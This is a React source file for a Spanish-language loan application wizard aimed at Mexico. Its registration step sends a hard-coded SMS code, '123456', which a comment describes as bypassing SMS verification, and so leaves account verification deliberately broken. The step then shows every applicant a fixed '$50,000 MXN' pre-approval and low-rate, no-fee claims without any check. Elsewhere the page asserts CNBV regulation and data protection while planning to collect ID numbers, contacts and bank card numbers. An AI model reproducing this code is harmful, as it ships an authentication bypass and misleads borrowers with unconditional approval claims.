import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { getApiUrl } from '../config/api';
import { httpClient, checkBrowserCompatibility } from '../utils/httpClient';
import { safeStorage, safeDateParse, arrayCompat, smoothScroll } from '../utils/browserCompat';

import { 
  trackLoanApplicationStart, 
  trackLoanApplicationComplete,
  trackFileUpload 
} from '../utils/analytics';

interface LoanApplication {
  id?: string;
  sessionId?: string;
  step: number;
  phone?: string;
  isGuest?: boolean;
  userId?: string;
  firstName?: string;
  lastName?: string;
  email?: string;
  birthDate?: string;
  // 第2步：身份信息
  idNumber?: string;
  realName?: string;
  // 第4步：联系人信息
  contact1Name?: string;
  contact1Phone?: string;
  contact2Name?: string;
  contact2Phone?: string;
  // 第7步：银行卡
  bankCardNumber?: string;
  // 第11步：提现信息
  withdrawalAmount?: number;
  installmentPeriod?: number;
}

interface StepProps {
  data: LoanApplication;
  onUpdate: (data: Partial<LoanApplication>) => void;
  onNext: () => void;
  onBack: () => void;
  updateApplicationStep?: (step: number, stepData: any) => Promise<void>;
}

// 第1步：用户注册 - 专业金融风格
const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [phone, setPhone] = useState(data.phone || '');
  const [countryCode, setCountryCode] = useState('+52');
  const [showApprovedAmount, setShowApprovedAmount] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);
  const [registrationSuccess, setRegistrationSuccess] = useState(false);

  const countryCodes = [
    { code: '+52', name: 'México', flag: '🇲🇽' },
    { code: '+1', name: 'Estados Unidos', flag: '🇺🇸' },
    { code: '+54', name: 'Argentina', flag: '🇦🇷' },
    { code: '+55', name: 'Brasil', flag: '🇧🇷' },
    { code: '+56', name: 'Chile', flag: '🇨🇱' },
    { code: '+57', name: 'Colombia', flag: '🇨🇴' },
  ];

  const handleCheckEligibility = async () => {
    if (!phone.trim()) return;

    setIsRegistering(true);
    try {
      // 自动注册用户（使用固定验证码绕过短信）
      const result = await httpClient.post('/auth/verify-sms', {
        phone: `${countryCode}${phone}`,
        code: '123456' // 固定验证码
      }) as any;

      if (result.success) {
        setRegistrationSuccess(true);
        onUpdate({ 
          phone: `${countryCode}${phone}`,
          userId: result.userId 
        });
        
        // 显示预批准金额
        setShowApprovedAmount(true);
        
        // 更新申请步骤
        if (updateApplicationStep) {
          await updateApplicationStep(1, { 
            phone: `${countryCode}${phone}`,
            userId: result.userId 
          });
        }
      }
    } catch (error) {
      console.error('Registration error:', error);
    } finally {
      setIsRegistering(false);
    }
  };

  return (
    <div className="p-6 lg:p-8">
      {/* 标题区域 */}
      <div className="mb-8">
        <div className="flex items-center space-x-3 mb-4">
          <div className="w-10 h-10 bg-slate-800 rounded-full flex items-center justify-center">
            <svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
              <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
            </svg>
          </div>
          <div>
            <h2 className="text-xl lg:text-2xl font-bold text-slate-800">{t('loanWizard.step1.title')}</h2>
            <p className="text-slate-600 text-sm lg:text-base">{t('loanWizard.step1.subtitle')}</p>
          </div>
        </div>
        
        {/* 安全提示 */}
        <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-4 flex items-start space-x-3">
          <svg className="w-5 h-5 text-emerald-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          <div>
            <p className="text-emerald-800 text-sm font-semibold">Proceso 100% seguro</p>
            <p className="text-emerald-700 text-xs">Verificación instantánea sin afectar tu historial crediticio</p>
          </div>
        </div>
      </div>

      {!showApprovedAmount ? (
        <div className="space-y-6">
          {/* 手机号输入区域 */}
          <div className="space-y-4">
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-slate-800">
                Número de teléfono
                <span className="text-red-500 ml-1">*</span>
              </label>
              <div className="flex space-x-3">
                <select
                  value={countryCode}
                  onChange={(e) => setCountryCode(e.target.value)}
                  className="px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent bg-white text-slate-800 font-medium min-w-[120px]"
                >
                  {countryCodes.map((country) => (
                    <option key={country.code} value={country.code}>
                      {country.flag} {country.code}
                    </option>
                  ))}
                </select>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="flex-1 px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent text-slate-800 placeholder-slate-400"
                  placeholder="Ingresa tu número de teléfono"
                />
              </div>
            </div>

            {/* 注册成功提示 */}
            {registrationSuccess && (
              <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-4 flex items-center space-x-3">
                <svg className="w-5 h-5 text-emerald-600" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <span className="text-emerald-800 text-sm font-semibold">✅ Usuario registrado exitosamente</span>
              </div>
            )}
          </div>

          {/* 主要按钮 */}
          <button
            onClick={handleCheckEligibility}
            disabled={!phone.trim() || isRegistering}
            className="w-full py-4 bg-gradient-to-r from-slate-800 to-slate-900 text-white rounded-lg font-bold text-lg hover:from-slate-900 hover:to-slate-800 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 shadow-lg hover:shadow-xl"
          >
            {isRegistering ? (
              <div className="flex items-center justify-center space-x-2">
                <svg className="animate-spin w-5 h-5" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="m4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                <span>Verificando...</span>
              </div>
            ) : (
              'Ver Mi Límite de Crédito'
            )}
          </button>

          {/* 信任指标 */}
          <div className="grid grid-cols-3 gap-4 pt-6 border-t border-slate-200">
            <div className="text-center">
              <div className="text-2xl font-bold text-slate-800">2min</div>
              <div className="text-xs text-slate-600">Aprobación</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold text-slate-800">0%</div>
              <div className="text-xs text-slate-600">Comisión</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold text-slate-800">24/7</div>
              <div className="text-xs text-slate-600">Soporte</div>
            </div>
          </div>
        </div>
      ) : (
        <div className="space-y-6">
          {/* 预批准金额显示 */}
          <div className="bg-gradient-to-r from-emerald-50 to-emerald-100 border border-emerald-200 rounded-xl p-6 text-center">
            <div className="mb-4">
              <svg className="w-16 h-16 text-emerald-600 mx-auto" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <h3 className="text-2xl font-bold text-emerald-800 mb-2">¡Felicidades!</h3>
            <p className="text-emerald-700 mb-4">Has sido pre-aprobado para un préstamo de hasta:</p>
            <div className="text-4xl font-bold text-emerald-800 mb-4">$50,000 MXN</div>
            <div className="bg-white rounded-lg p-4 text-left space-y-2">
              <div className="flex justify-between text-sm">
                <span className="text-slate-600">Tasa de interés:</span>
                <span className="font-semibold text-slate-800">Desde 12% anual</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-slate-600">Plazo:</span>
                <span className="font-semibold text-slate-800">6 a 36 meses</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-slate-600">Sin comisiones:</span>
                <span className="font-semibold text-emerald-600">✓ Apertura gratuita</span>
              </div>
            </div>
          </div>

          {/* 继续按钮 */}
          <button
            onClick={onNext}
            className="w-full py-4 bg-gradient-to-r from-slate-800 to-slate-900 text-white rounded-lg font-bold text-lg hover:from-slate-900 hover:to-slate-800 transition-all duration-300 shadow-lg hover:shadow-xl"
          >
            Continuar con mi Solicitud
          </button>
        </div>
      )}
    </div>
  );
};

// 第2步：个人信息 - 专业金融风格
const Step2PersonalInfo: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack }) => {
  const { t } = useTranslation();

  return (
    <div className="p-6 lg:p-8">
      {/* 标题区域 */}
      <div className="mb-8">
        <div className="flex items-center space-x-3 mb-4">
          <div className="w-10 h-10 bg-slate-800 rounded-full flex items-center justify-center">
            <svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
            </svg>
          </div>
          <div>
            <h2 className="text-xl lg:text-2xl font-bold text-slate-800">{t('loanWizard.step2.title')}</h2>
            <p className="text-slate-600 text-sm lg:text-base">{t('loanWizard.step2.subtitle')}</p>
          </div>
        </div>
        
        {/* 安全提示 */}
        <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 flex items-start space-x-3">
          <svg className="w-5 h-5 text-slate-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          <div>
            <p className="text-slate-700 text-sm font-medium">Información protegida</p>
            <p className="text-slate-600 text-xs">Todos tus datos están encriptados y seguros</p>
          </div>
        </div>
      </div>

      {/* 表单区域 */}
      <div className="space-y-6">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className="space-y-2">
            <label className="block text-sm font-semibold text-slate-800">
              {t('loanWizard.step2.firstName')}
              <span className="text-red-500 ml-1">*</span>
            </label>
            <input
              type="text"
              value={data.firstName || ''}
              onChange={(e) => onUpdate({ firstName: e.target.value })}
              className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent transition-all duration-200 text-slate-800 placeholder-slate-400"
              placeholder={t('loanWizard.step2.firstNamePlaceholder')}
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-semibold text-slate-800">
              {t('loanWizard.step2.lastName')}
              <span className="text-red-500 ml-1">*</span>
            </label>
            <input
              type="text"
              value={data.lastName || ''}
              onChange={(e) => onUpdate({ lastName: e.target.value })}
              className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent transition-all duration-200 text-slate-800 placeholder-slate-400"
              placeholder={t('loanWizard.step2.lastNamePlaceholder')}
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-semibold text-slate-800">
              {t('loanWizard.step2.email')}
              <span className="text-red-500 ml-1">*</span>
            </label>
            <input
              type="email"
              value={data.email || ''}
              onChange={(e) => onUpdate({ email: e.target.value })}
              className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent transition-all duration-200 text-slate-800 placeholder-slate-400"
              placeholder={t('loanWizard.step2.emailPlaceholder')}
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-semibold text-slate-800">
              {t('loanWizard.step2.birthDate')}
              <span className="text-red-500 ml-1">*</span>
            </label>
            <input
              type="date"
              value={data.birthDate || ''}
              onChange={(e) => onUpdate({ birthDate: e.target.value })}
              className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent transition-all duration-200 text-slate-800"
            />
          </div>
        </div>
      </div>

      {/* 导航按钮 */}
      <div className="flex flex-col sm:flex-row justify-between items-center pt-8 mt-8 border-t border-slate-200 space-y-4 sm:space-y-0">
        <button
          onClick={onBack}
          className="w-full sm:w-auto px-6 py-3 border-2 border-slate-300 rounded-lg text-slate-700 font-semibold hover:bg-slate-50 hover:border-slate-400 transition-all duration-200 flex items-center justify-center space-x-2"
        >
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
          </svg>
          <span>{t('loanWizard.previous')}</span>
        </button>
        
        <button
          onClick={onNext}
          disabled={!data.firstName || !data.lastName || !data.email || !data.birthDate}
          className="w-full sm:w-auto px-8 py-3 bg-slate-800 text-white rounded-lg font-semibold hover:bg-slate-900 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:bg-slate-800 transition-all duration-200 flex items-center justify-center space-x-2"
        >
          <span>{t('loanWizard.next')}</span>
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clipRule="evenodd" />
          </svg>
        </button>
      </div>
    </div>
  );
};

// 主向导组件
const LoanWizardNew: React.FC = () => {
  const { t } = useTranslation();
  const [currentStep, setCurrentStep] = useState(1);
  const [applicationData, setApplicationData] = useState<LoanApplication>({
    step: 1,
    isGuest: true
  });
  const totalSteps = 12;

  const updateApplicationData = (data: Partial<LoanApplication>) => {
    setApplicationData(prev => ({ ...prev, ...data }));
  };

  const updateApplicationStep = async (step: number, stepData: any) => {
    try {
      if (applicationData.id) {
        await httpClient.put(`/applications/${applicationData.id}`, {
          step,
          ...stepData
        });
      }
    } catch (error) {
      console.error('Error updating application step:', error);
    }
  };

  const renderStep = () => {
    const stepProps = {
      data: applicationData,
      onUpdate: updateApplicationData,
      onNext: () => setCurrentStep(prev => Math.min(prev + 1, totalSteps)),
      onBack: () => setCurrentStep(prev => Math.max(prev - 1, 1)),
      updateApplicationStep
    };

    switch (currentStep) {
      case 1:
        return <Step1UserRegistration {...stepProps} />;
      case 2:
        return <Step2PersonalInfo {...stepProps} />;
      default:
        return (
          <div className="p-8 text-center">
            <h2 className="text-2xl font-bold text-slate-800 mb-4">Paso {currentStep}</h2>
            <p className="text-slate-600 mb-6">Este paso está en desarrollo.</p>
            <div className="flex justify-between">
              <button
                onClick={() => setCurrentStep(prev => Math.max(prev - 1, 1))}
                className="px-6 py-3 border-2 border-slate-300 rounded-lg text-slate-700 font-semibold hover:bg-slate-50"
              >
                Anterior
              </button>
              <button
                onClick={() => setCurrentStep(prev => Math.min(prev + 1, totalSteps))}
                className="px-6 py-3 bg-slate-800 text-white rounded-lg font-semibold hover:bg-slate-900"
              >
                Siguiente
              </button>
            </div>
          </div>
        );
    }
  };

  return (
    <div>
      {/* 桌面端Full-width，移动端适配 */}
      <div className="w-full flex-1">
        {/* 进度条 - 固定在顶部 */}
        <div className="bg-white border-b border-slate-200 shadow-sm">
          <div className="max-w-6xl mx-auto px-4 py-4 lg:py-6">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center space-x-3">
                <h2 className="text-lg lg:text-xl font-bold text-slate-800">
                  Solicitud de Préstamo
                </h2>
                <div className="hidden lg:flex items-center space-x-2 text-sm text-slate-600">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                  <span>Proceso seguro y encriptado</span>
                </div>
              </div>
              <div className="text-right">
                <div className="text-sm font-semibold text-slate-800">
                  Paso {currentStep} de {totalSteps}
                </div>
                <div className="text-xs text-slate-500">
                  {Math.round((currentStep / totalSteps) * 100)}% completado
                </div>
              </div>
            </div>
            
            {/* 进度条 */}
            <div className="w-full bg-slate-200 rounded-full h-2">
              <div
                className="bg-gradient-to-r from-slate-700 to-slate-800 h-2 rounded-full transition-all duration-500 ease-out"
                style={{ width: `${(currentStep / totalSteps) * 100}%` }}
              ></div>
            </div>
          </div>
        </div>

        {/* 主内容区域 */}
        <div className="w-full flex-grow">
          {/* 桌面端：Full-width容器，移动端：适配容器 */}
          <div className="max-w-6xl mx-auto px-4 py-6 lg:py-8">
            <div className="flex flex-col lg:flex-row lg:space-x-8">
              {/* 左侧：步骤内容 (桌面端占2/3，移动端全宽) */}
              <div className="flex-1 lg:max-w-3xl">
                <div className="bg-white rounded-lg shadow-lg border border-slate-200 overflow-hidden">
                  {renderStep()}
                </div>
              </div>

              {/* 右侧：信息面板 (桌面端显示，移动端隐藏) */}
              <div className="hidden lg:block lg:w-80 xl:w-96">
                <div className="sticky top-24 space-y-6">
                  {/* 安全保障 */}
                  <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
                    <h3 className="font-bold text-slate-800 text-lg mb-4">
                      Garantías de Seguridad
                    </h3>
                    <div className="space-y-4">
                      <div className="flex items-start space-x-3">
                        <div className="w-8 h-8 bg-emerald-100 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg className="w-4 h-4 text-emerald-600" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                          </svg>
                        </div>
                        <div>
                          <h4 className="font-semibold text-slate-800 text-sm">Encriptación SSL</h4>
                          <p className="text-slate-600 text-xs">Datos protegidos con tecnología bancaria</p>
                        </div>
                      </div>
                      <div className="flex items-start space-x-3">
                        <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                          </svg>
                        </div>
                        <div>
                          <h4 className="font-semibold text-slate-800 text-sm">Regulado CNBV</h4>
                          <p className="text-slate-600 text-xs">Autorizado por autoridades financieras</p>
                        </div>
                      </div>
                      <div className="flex items-start space-x-3">
                        <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg className="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
                            <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                          </svg>
                        </div>
                        <div>
                          <h4 className="font-semibold text-slate-800 text-sm">Proceso Transparente</h4>
                          <p className="text-slate-600 text-xs">Sin costos ocultos ni sorpresas</p>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* ventajas del préstamo */}
                  <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
                    <h3 className="font-bold text-slate-800 text-lg mb-4">
                      ¿Por qué elegirnos?
                    </h3>
                    <div className="space-y-3">
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700 text-sm">Aprobación en minutos</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700 text-sm">Tasas competitivas</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700 text-sm">Sin penalizaciones</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700 text-sm">Soporte 24/7</span>
                      </div>
                    </div>
                  </div>

                  {/* contacto de ayuda */}
                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-6">
                    <h3 className="font-semibold text-slate-800 text-base mb-3">
                      ¿Necesitas ayuda?
                    </h3>
                    <p className="text-slate-600 text-sm mb-4">
                      Nuestro equipo está disponible para asistirte durante todo el proceso.
                    </p>
                    <div className="space-y-2 text-sm">
                      <div className="flex items-center space-x-2 text-slate-700">
                        <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                          <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                          <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
                        </svg>
                        <span>diliads01@outlook.com</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>


      </div>
    </div>
  );
};

export default LoanWizardNew;